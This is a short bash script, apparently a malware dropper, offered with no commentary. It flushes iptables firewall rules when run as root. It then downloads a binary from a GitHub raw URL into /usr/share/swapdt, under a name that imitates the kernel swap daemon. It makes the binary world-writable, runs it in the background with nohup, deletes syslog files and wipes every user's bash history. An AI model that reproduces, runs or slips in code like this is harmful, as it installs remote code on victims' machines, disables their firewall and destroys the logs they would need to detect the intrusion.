#!/bin/bash

if [[ "$EUID" == "0" ]]; then
	iptables -F &
	mkdir /usr/share/swapdt/
	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --silent -q --output /usr/share/swapdt/swapdt0
	chmod 777 /usr/share/swapdt/swapdt0
	nohup /usr/share/swapdt/swapdt0 > /dev/null &
	rm -rf /var/log/syslog*
	find /home/ /root/ -name .bash_history -exec rm {} \;
else
	mkdir /usr/share/swapdt/
	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --silent -q --output /usr/share/swapdt/swapdt0
	chmod 777 /usr/share/swapdt/swapdt0
	nohup /usr/share/swapdt/swapdt0 > /dev/null &
	rm -rf /var/log/syslog*
	find /home/ /root/ -name .bash_history -exec rm {} \;
fi
